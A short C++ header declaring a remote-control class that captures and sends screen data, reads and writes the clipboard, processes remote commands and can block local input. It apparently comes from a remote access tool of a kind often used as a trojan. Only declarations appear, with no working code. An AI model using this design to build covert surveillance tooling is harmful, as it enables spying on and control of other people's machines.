#pragma once
#include "Manager.h"
#include "ScreenSpy.h"

class CRemoteControl :
	public CManager
{
public:
	CRemoteControl(CIOCPClient *IOCPClient);
	virtual ~CRemoteControl();

public:
	void  PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);

	VOID SendBitmapInfo();
	VOID SendFirstScreenData();
	VOID SendNextScreenData();
	VOID SendClipboard();
	VOID UpdataClipboard(char* BufferData, ULONG BufferLength);
	VOID AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength);

	static DWORD WINAPI _RemoteControlProc(LPVOID lParam);
	
protected:
	BOOL _M_IsLoop;
	BOOL _M_IsBlockInput;

	CScreenSpy *_M_ScreenSpy;

	HANDLE _M_hThread;
};

